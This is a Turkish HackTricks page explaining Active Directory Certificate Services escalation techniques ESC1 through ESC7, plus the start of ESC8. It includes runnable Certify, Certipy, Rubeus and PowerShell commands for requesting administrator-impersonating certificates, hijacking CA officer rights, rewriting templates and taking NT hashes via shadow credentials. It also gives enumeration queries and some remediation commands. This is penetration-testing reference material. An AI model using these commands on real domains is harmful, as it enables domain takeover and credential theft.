# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Bu, gönderilerdeki escalation technique bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Certificate Templates - ESC1

### Açıklama

### Yanlış Yapılandırılmış Certificate Templates - ESC1 Açıklaması

- **Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.**
- **Manager onayı gerekli değildir.**
- **Yetkili personelden imza alınması gerekmez.**
- **Certificate template'lerindeki security descriptor'lar aşırı izin verici şekilde yapılandırılmıştır; bu da düşük ayrıcalıklı kullanıcıların enrollment hakları edinmesine olanak tanır.**
- **Certificate template'ler, authentication'ı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU bulunmaması (SubCA) gibi Extended Key Usage (EKU) tanımlayıcıları dahil edilmiştir.
- **İstekte bulunanların Certificate Signing Request (CSR) içine bir subjectAltName ekleyebilmesine template tarafından izin verilir:**
- Active Directory (AD), mevcut olması durumunda kimlik doğrulaması için bir certificate içindeki subjectAltName'i (SAN) önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcının (örneğin bir domain administrator'ın) kimliğine bürünmek üzere bir certificate talep edilebileceği anlamına gelir. İstekte bulunan kişinin SAN belirtip belirtemeyeceği, certificate template'in AD object'i içindeki `mspki-certificate-name-flag` property'si tarafından belirlenir. Bu property bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin bulunması, SAN'ın istekte bulunan kişi tarafından belirtilmesine izin verir.

> [!CAUTION]
> Açıklanan configuration, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile certificate talep etmesine olanak tanır ve Kerberos veya SChannel üzerinden herhangi bir domain principal olarak authentication yapılmasını mümkün kılar.

Bu feature bazen ürünler veya deployment service'leri tarafından HTTPS veya host certificate'lerinin anlık olarak oluşturulmasını desteklemek ya da bilgi eksikliği nedeniyle etkinleştirilir.

Bu seçenekle bir certificate oluşturulmasının bir warning tetiklediği belirtilmiştir. Ancak `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` template'i gibi mevcut bir certificate template'i duplicate edilip authentication OID'i içerecek şekilde değiştirildiğinde aynı durum geçerli değildir.<sup>[[6]](#references)</sup>

### Abuse

**Vulnerable certificate template'leri bulmak** için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**Bir yöneticiyi taklit etmek için bu zafiyet kötüye kullanılabilir:**
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **sertifikayı `.pfx` formatına** dönüştürebilir ve bunu tekrar **Rubeus veya certipy kullanarak kimlik doğrulaması yapmak** için kullanabilirsiniz:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikilileri "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ın yapılandırma şeması içindeki certificate template'lerinin; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkinleştirilmiş template'lerin enumeration işlemi, aşağıdaki LDAP query çalıştırılarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Certificate Templates - ESC2

### Açıklama

İkinci abuse senaryosu, ilkinin bir varyasyonudur:

1. Enrollment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Manager approval gereksinimi devre dışı bırakılır.
3. Authorized signatures gereksinimi atlanır.
4. Certificate template üzerindeki aşırı izinli bir security descriptor, düşük ayrıcalıklı kullanıcılara certificate enrollment hakları verir.
5. **Certificate template, Any Purpose EKU veya EKU olmadan tanımlanmıştır.**

**Any Purpose EKU**, bir certificate'ın client authentication, server authentication, code signing vb. **herhangi bir amaçla** kullanılmak üzere attacker tarafından alınmasına izin verir. **ESC3 için kullanılan tekniğin** aynısı, bu senaryoyu exploit etmek için kullanılabilir.

**EKU içermeyen** ve subordinate CA certificate olarak işlev gören certificate'lar **herhangi bir amaçla** exploit edilebilir ve **yeni certificate'ları imzalamak için de kullanılabilir**. Bu nedenle attacker, subordinate CA certificate kullanarak yeni certificate'larda rastgele EKU'lar veya alanlar belirtebilir.

Ancak, subordinate CA **`NTAuthCertificates`** object'i tarafından trusted değilse, **domain authentication** için oluşturulan yeni certificate'lar çalışmaz; bu varsayılan ayardır. Bununla birlikte attacker, **herhangi bir EKU'ya** ve rastgele certificate değerlerine sahip **yeni certificate'lar** oluşturabilir. Bunlar çok çeşitli amaçlar için (ör. code signing, server authentication vb.) potansiyel olarak **abuse** edilebilir ve SAML, AD FS veya IPSec gibi network'teki diğer uygulamalar açısından önemli sonuçlar doğurabilir.<sup>[[6]](#references)</sup>

AD Forest’ın configuration schema'sı içinde bu senaryoyla eşleşen template'leri enumerate etmek için aşağıdaki LDAP query çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Hatalı Yapılandırılmış Enrolment Agent Template'leri - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer, ancak **farklı bir EKU'nun** (Certificate Request Agent) ve **2 farklı template'in** kötüye kullanılmasını içerir (bu nedenle 2 gereksinim kümesi vardır).

Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinen **Certificate Request Agent EKU'su** (OID 1.3.6.1.4.1.311.20.2.1), bir principal'ın **başka bir kullanıcı adına** **certificate** için **enroll** olmasına izin verir.

**“Enrollment agent”**, böyle bir **template** üzerinde **enroll** olur ve ortaya çıkan **certificate'i, diğer kullanıcı adına bir CSR'yi ortak imzalamak için kullanır**. Ardından **ortak imzalanmış CSR'yi**, **“enroll on behalf of”** işlemine izin veren bir **template** üzerinde **enroll** olmak üzere CA'ya **gönderir** ve CA, **“diğer” kullanıcıya ait bir certificate** ile yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA tarafından düşük yetkili kullanıcılara enrollment hakları verilir.
- Manager approval gereksinimi atlanmıştır.
- Yetkili imzalar için herhangi bir gereksinim yoktur.
- Certificate template'in security descriptor'ı aşırı izin vericidir ve düşük yetkili kullanıcılara enrollment hakları verir.
- Certificate template, Certificate Request Agent EKU'sunu içerir ve diğer principal'lar adına diğer certificate template'leri için request yapılmasını sağlar.

**Gereksinimler 2:**

- Enterprise CA, düşük yetkili kullanıcılara enrollment hakları verir.
- Manager approval atlanır.
- Template'in schema version'ı 1'dir veya 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Certificate template'te tanımlanan bir EKU, domain authentication'ı sağlar.
- CA üzerinde enrollment agent kısıtlamaları uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** **edinmesine** izin verilen **kullanıcılar**, enrollment **agent'larının** enroll olmasına izin verilen şablonlar ve enrollment agent'ının adına işlem yapabileceği **hesaplar**, enterprise CA'ler tarafından kısıtlanabilir. Bu işlem `certsrc.msc` **snap-in'inin** açılması, **CA'ye sağ tıklanması**, **Properties** seçeneğine **tıklanması** ve ardından “Enrollment Agents” sekmesine **gidilmesiyle** gerçekleştirilir.

Ancak CA'ler için **varsayılan** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agent'ları üzerindeki kısıtlamayı etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile varsayılan yapılandırma son derece izin vericidir. **Everyone** grubunun tüm şablonlarda herhangi biri olarak enroll olmasına izin verir.

### Certi-Bhai ile yalnızca Windows'ta çalışan PowerShell PoC'leri

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai), Certify veya Certipy olmadan ESC1 ve ESC2/ESC3'ü test eder. Script'leri `X509Enrollment` COM API ile export edilebilir 2048 bitlik bir RSA anahtarı oluşturur, bir PKCS#10 isteği hazırlar, LDAP üzerinden ilk `pKIEnrollmentService` nesnesini keşfeder, isteği `CertificateAuthority.Request` aracılığıyla gönderir, yanıtı `Cert:\CurrentUser\My` konumuna yükler ve Base64 kodlamalı bir PFX olarak export eder. ESC1 script'i saldırganın seçtiği bir UPN SAN'ı (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, değeri `0xb`) eklerken ESC2/ESC3 script'leri ilk sertifikayı kullanarak on-behalf-of bir PKCS#7 isteğini imzalar.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Scriptler, Rubeus ile doğrudan kullanım için özel anahtarı içeren **PFX**'in Base64 değerini yazdırır. Bunu `[Convert]::ToBase64String($cert.RawData)` ile değiştirmeyin: `RawData` yalnızca public certificate'i encode eder ve PKINIT isteğini imzalayamaz.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Güvenlik Açığı Bulunan Sertifika Şablonu Erişim Denetimi - ESC4

### **Açıklama**

**Sertifika şablonları** üzerindeki **security descriptor**, belirli **AD principals**'ın şablonla ilgili sahip olduğu **permissions**'ları tanımlar.

Bir **attacker**, bir **template**'i **alter** etmek ve **önceki bölümlerde** açıklanan **exploitable misconfigurations**'lardan herhangi birini **uygulamak** için gerekli **permissions**'lara sahipse privilege escalation gerçekleştirilebilir.

Sertifika şablonları için geçerli önemli permissions şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük denetim sağlar ve tüm özniteliklerin değiştirilmesine olanak tanır.
- **FullControl:** Herhangi bir özniteliği değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin sahibinin attacker'ın denetimindeki bir principal ile değiştirilmesine izin verir.
- **WriteDacl:** Erişim denetimlerinin ayarlanmasına olanak tanır ve potansiyel olarak bir attacker'a FullControl verebilir.
- **WriteProperty:** Herhangi bir nesne özelliğinin düzenlenmesine izin verir.

### İstismar

Şablonlar ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip principal'ları belirlemek için Certify ile enumerate edin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Önceki örnektekine benzer bir privesc:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının certificate template üzerinde yazma ayrıcalıklarına sahip olmasıdır. Bu, örneğin certificate template yapılandırmasının üzerine yazılarak template'in ESC1'e karşı savunmasız hâle getirilmesi için kötüye kullanılabilir.

Yukarıdaki path'te görebileceğimiz gibi, bu ayrıcalıklara yalnızca `JOHNPC` sahip; ancak kullanıcımız `JOHN`, `JOHNPC` nesnesine yeni `AddKeyCredentialLink` edge'ine sahip. Bu technique certificates ile ilişkili olduğundan, [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen bu attack'i de implement ettim.<sup>[[8]](#references)</sup> Aşağıda, victim'ın NT hash'ini almak için Certipy'nin `shadow auto` command'ının küçük bir önizlemesini görebilirsiniz.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, tek bir komutla bir certificate template'in yapılandırmasının üzerine yazabilir. **Varsayılan olarak** Certipy, yapılandırmanın **ESC1'e karşı vulnerable** hâle gelmesi için üzerine yazar. Ayrıca eski yapılandırmayı kaydetmek için **`-save-old` parametresini belirtebiliriz**; bu, attack işlemimizden sonra yapılandırmayı **restore etmek** için kullanışlı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Güvenlik Açığı Bulunan PKI Nesnesi Erişim Denetimi - ESC5

### Açıklama

Sertifika template'leri ve sertifika yetkilisinin yanı sıra çeşitli nesneleri de içeren kapsamlı, birbirine bağlı ACL tabanlı ilişkiler ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilen bu nesneler şunları kapsar:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla ele geçirilebilen CA sunucusunun AD bilgisayar nesnesi.
- CA sunucusunun RPC/DCOM sunucusu.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` yolundaki belirli container içinde bulunan tüm alt AD nesneleri veya container'lar. Bu yol, Certificate Templates container'ı, Certification Authorities container'ı, NTAuthCertificates nesnesi ve Enrollment Services Container gibi container ve nesneleri içerir ancak bunlarla sınırlı değildir.

Düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi birinin denetimini ele geçirmeyi başarırsa PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) ele alınan konu, Microsoft tarafından açıklanan **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkilerine de değinmektedir. Bir Certification Authority (CA) üzerinde etkinleştirildiğinde bu configuration, Active Directory® üzerinden oluşturulanlar da dahil olmak üzere **herhangi bir request** için **subject alternative name** alanına **kullanıcı tarafından tanımlanan değerlerin** eklenmesine izin verir. Sonuç olarak bu özellik, bir **intruder**'ın domain **authentication** için yapılandırılmış **herhangi bir template** üzerinden enrollment gerçekleştirmesine olanak tanır; buna standart User template gibi **ayrıcalıksız** kullanıcıların enrollment yapmasına açık template'ler de dahildir. Böylece bir certificate elde edilerek intruder'ın domain administrator veya domain içindeki **başka herhangi bir etkin varlık** olarak authenticate olması sağlanabilir.<sup>[[9]](#references)</sup>

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argümanı aracılığıyla bir Certificate Signing Request (CSR) içine **alternative names** ekleme yöntemi ( “Name Value Pairs” olarak adlandırılır), ESC1'deki SAN exploitation stratejisinden **farklıdır**. Buradaki fark, account bilgilerinin nasıl kapsüllendiğinde yatar: bilgiler bir extension yerine certificate attribute içinde bulunur.

### Abuse

Setting'in etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki command'i kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem temel olarak **remote registry access** kullanır; bu nedenle alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain administrative** haklarına veya eşdeğerine sahip olunduğu varsayılarak, aşağıdaki komut herhangi bir workstation üzerinden çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için flag şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra yeni verilen **sertifikalar**, **istekte bulunanın `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil, **istekte bulunanın `objectSid`** değerini yansıtır.\
> ESC6'yı exploit etmek için sistemin, **SAN'ı yeni güvenlik uzantısına göre önceliklendiren** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması gerekir.

## Güvenlik Açığı Bulunan Certificate Authority Erişim Denetimi - ESC7

### Saldırı 1

#### Açıklama

Bir certificate authority için erişim denetimi, CA eylemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler `certsrv.msc` açılarak, bir CA'ya sağ tıklanarak, properties seçilerek ve ardından Security sekmesine gidilerek görüntülenebilir. Ayrıca izinler, aşağıdakine benzer komutlarla PSPKI module kullanılarak enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** temel hakları hakkında bilgi sağlar.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Bir sertifika yetkilisi üzerinde **`ManageCA`** haklarına sahip olmak, principal'ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template'te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkinleştirilmesi de dahildir; bu, domain escalation için kritik bir unsurdur.

Bu işlem, PSPKI'nin **Enable-PolicyModuleFlag** cmdlet'i kullanılarak basitleştirilebilir ve doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanır.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını kolaylaştırarak “CA certificate manager approval” güvenlik önlemini etkili bir şekilde devre dışı bırakır.

Bir certificate istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin bir kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> **Önceki saldırıda**, **ESC6 saldırısını** gerçekleştirmek için **EDITF_ATTRIBUTESUBJECTALTNAME2** flag'ini **etkinleştirmek** amacıyla **`Manage CA`** izinleri kullanıldı; ancak CA hizmeti (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmayacaktır. Bir kullanıcı `Manage CA` erişim hakkına sahip olduğunda, bu kullanıcı hizmeti **yeniden başlatma** yetkisine de sahip olur. Ancak bu, kullanıcının hizmeti **uzaktan yeniden başlatabileceği** anlamına gelmez. Ayrıca, Mayıs 2022 security updates nedeniyle çoğu patch uygulanmış ortamda **E**SC6, genellikle **varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` izni**
- **`Manage Certificates`** izni (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** certificate template'i **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Bu teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız certificate request'leri yayınlayabilmesine** dayanır. **`SubCA`** certificate template'i **ESC1'e karşı savunmasızdır**, ancak template'e yalnızca **administrator'lar** enroll olabilir. Bu nedenle bir **kullanıcı**, **`SubCA`** template'ine enroll olmak için **request** gönderebilir; bu request **reddedilir**, ancak **daha sonra manager tarafından yayınlanır**.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Kullanıcınızı yeni bir officer olarak ekleyerek **`Manage Certificates`** erişim hakkını kendinize verebilirsiniz.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, `-enable-template` parametresiyle **CA üzerinde etkinleştirilebilir**. Varsayılan olarak `SubCA` şablonu etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonunu temel alan bir sertifika isteğinde bulunarak** başlayabiliriz.

**Bu istek reddedil**ecektir, ancak özel anahtarı kaydedip istek kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile ardından `ca` komutu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika** isteğini yayınlayabiliriz.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Son olarak, `req` komutu ve `-retrieve <request ID>` parametresiyle **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Saldırı 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 abuse yöntemlerine (EDITF özniteliklerini etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0**, Enterprise CA üzerinde yalnızca *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CA'ler tarafından **bekleyen** isteklerdeki extension'ları güncellemek için kullanılsa da bir attacker, onay bekleyen bir isteğe **varsayılan olmayan bir certificate extension** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) eklemek için bu yöntemi abuse edebilir.

Hedeflenen template bu extension için **varsayılan bir değer tanımlamadığından**, istek sonunda verildiğinde CA attacker tarafından kontrol edilen değerin üzerine yazmaz. Bu nedenle ortaya çıkan certificate, attacker tarafından seçilen bir extension içerir ve bu extension:

* Diğer vulnerable template'ların Application / Issuance Policy gereksinimlerini karşılayabilir (privilege escalation ile sonuçlanabilir).
* Certificate'a, üçüncü taraf sistemlerde beklenmedik bir trust sağlayan ek EKU'lar veya policy'ler enjekte edebilir.

Kısacası, daha önce ESC7'nin “daha az güçlü” kısmı olarak değerlendirilen *Manage Certificates*, artık CA configuration'ına dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden full privilege escalation ya da uzun vadeli persistence için kullanılabilir.

#### Certify 2.0 ile primitive'i abuse etme

1. **Beklemede kalacak bir certificate request gönderin.** Bu, manager approval gerektiren bir template ile zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Döndürülen Request ID'yi not alın
```

2. Yeni `manage-ca` command'ini kullanarak bekleyen request'e özel bir extension ekleyin:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # sahte issuance-policy OID'si
```
*Template halihazırda *Certificate Issuance Policies* extension'ını tanımlamıyorsa yukarıdaki değer issuance sonrasında korunur.*

3. Request'i **verin** (rolünüzde *Manage Certificates* approval yetkileri de varsa) veya bir operator'ün onaylamasını bekleyin. Verildikten sonra certificate'ı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan certificate artık malicious issuance-policy OID'sini içerir ve sonraki attack'lerde (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOT: Aynı attack, `ca` command'i ve `-set-extension` parameter'ı üzerinden Certipy ≥ 4.7 ile de gerçekleştirilebilir.

## AD CS HTTP Endpoint'lerine NTLM Relay – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **vulnerable bir web enrollment endpoint'i** mevcutsa ve en az bir **certificate template**, **domain computer enrollment ve client authentication** işlemlerine izin verecek şekilde publish edilmişse (varsayılan **`Machine`** template'i gibi), spooler service'i aktif olan **herhangi bir computer'ın bir attacker tarafından compromise edilmesi mümkün hale gelir**!

AD CS tarafından çeşitli **HTTP tabanlı enrollment yöntemleri** desteklenir ve bunlar administrator'ların kurabileceği ek server role'leri aracılığıyla kullanılabilir hale gelir. HTTP tabanlı certificate enrollment için kullanılan bu interface'ler **NTLM relay attack'lerine** açıktır. Bir attacker, **compromise edilmiş bir machine üzerinden inbound NTLM ile authentication gerçekleştiren herhangi bir AD account'unu impersonate edebilir**. Attacker, victim account'unu impersonate ederken bu web interface'lerine erişerek `User` veya `Machine` certificate template'lerini kullanıp client authentication certificate'ı talep edebilir.

